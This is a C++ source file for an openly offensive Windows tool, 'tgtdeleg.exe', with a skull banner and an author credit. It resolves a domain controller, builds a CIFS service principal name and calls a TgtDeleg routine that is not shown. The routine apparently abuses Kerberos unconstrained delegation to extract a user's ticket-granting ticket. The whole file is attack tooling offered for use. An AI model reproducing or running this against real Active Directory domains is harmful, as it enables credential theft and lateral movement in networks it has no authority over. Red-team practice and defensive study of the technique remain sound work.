#include "Header.h"


wchar_t* TargetSPN = NULL;
HANDLE hConsole;
void ShowAwesomeBanner() {
	hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
	SetConsoleTextAttribute(hConsole, 0x0C);
	std::cout << R"(
       .ed"""" """$$$$be.
     -"           ^""**$$$e.
   ."                   '$$$c
  /                      "4$$b
 d  3                      $$$$
 $  *                   .$$$$$$
.$  ^c           $$$$$e$$$$$$$$.
d$L  4.         4$$$$$$$$$$$$$$b
$$$$b ^ceeeee.  4$$ECL.F*$$$$$$$
$$$$P d$$$$F $ $$$$$$$$$- $$$$$$
3$$$F "$$$$b   $"$$$$$$$  $$$$*"
 $$P"  "$$b   .$ $$$$$...e$$
  *c    ..    $$ 3$$$$$$$$$$eF
    %ce""    $$$  $$$$$$$$$$*
     *$e.    *** d$$$$$"L$$
      $$$      4J$$$$$% $$$
     $"'$=e....$*$$**$cz$$"
     $  *=%4.$ L L$ P3$$$F
     $   "%*ebJLzb$e$$$$$b
      %..      4$$$$$$$$$$
       $$$e   z$$$$$$$$$$
        "*$c  "$$$$$$$P"
          """*$$$$$$$"

	TGT D3l3g@t1on Trick 
)" << std::endl;
	std::wcout << L"\t\t\t Michael Zhmaylo ( https://github.com/MzHmO )" << std::endl;
	SetConsoleTextAttribute(hConsole, 0x07);
}

LPCWSTR GetDomainController(wchar_t* domainName) {
	PDOMAIN_CONTROLLER_INFO dcInfo = NULL;
	DWORD err = DsGetDcName(NULL, (LPCWSTR)domainName, NULL, NULL, DS_RETURN_DNS_NAME | DS_IP_REQUIRED, &dcInfo);
	if (err != ERROR_SUCCESS) {
		std::wcout << L"[-] Cant Get DC Name, try use 2 mode: " << err << std::endl;
		exit(-1);
	}
	return dcInfo->DomainControllerName;
}
LPCWSTR addCIFS(LPCWSTR originalString) {
	size_t originalSize = wcslen(originalString);
	size_t cifsSize = 5;
	size_t newSize = originalSize + cifsSize + 1;
	LPWSTR newString = new WCHAR[newSize];
	wcscpy_s(newString, newSize, L"CIFS/");
	wcscat_s(newString, newSize, originalString);
	return newString;
}
LPCWSTR removeLeadingCharacters(LPCWSTR originalString) {
	LPCWSTR stringPtr = originalString;
	if (stringPtr[0] == L'\\' && stringPtr[1] == L'\\') {
		stringPtr += 2;
	}
	return stringPtr;
}
void ShowUsage() {
	std::wcout << L"tgtdeleg.exe 1 <DOMAIN NAME>\n\tEx: tgtdeleg.exe 1 cringe.lab" << std::endl;
	std::wcout << L"tgtdeleg.exe 2 <SPN With Unconstrained Deleg>\n\tEx: tgtdeleg.exe 2 CIFS/dc01.cringe.lab" << std::endl;
	exit(-1);
}
int wmain(char argc, wchar_t* argv[]) {
	setlocale(LC_ALL, "");
	ShowAwesomeBanner();
	if (argc != 3) {
		ShowUsage();
	}
	LPCWSTR targetname = NULL;
	switch (*argv[1]) {
	case '1':
		targetname = GetDomainController(argv[2]);
		break;
	case '2':
		if (TgtDeleg(argv[2]) == 0) {
			std::wcout << L"[+] TgtDeleg Success" << std::endl;
			return 0;
		}
		else {
			std::wcout << L"[-] TgtDeleg Error" << std::endl;
			return -1;
		}
		break;
	default:
		std::wcout << L"[-] No such mode" << std::endl;
		ShowUsage();
		return 0;
	}
	targetname = removeLeadingCharacters(targetname);
#ifdef DEBUG
	std::wcout << L"[+] Target: " << targetname << std::endl;
#endif
	LPCWSTR SPN = addCIFS(targetname);

#ifdef DEBUG
	std::wcout << L"[+] SPN: " << SPN << std::endl;
#endif
	if (TgtDeleg(SPN) == 0) {
		std::wcout << L"[+] TgtDeleg Success" << std::endl;
	}
	else {
		std::wcout << L"[-] TgtDeleg Error" << std::endl;
	}

	return 0;
}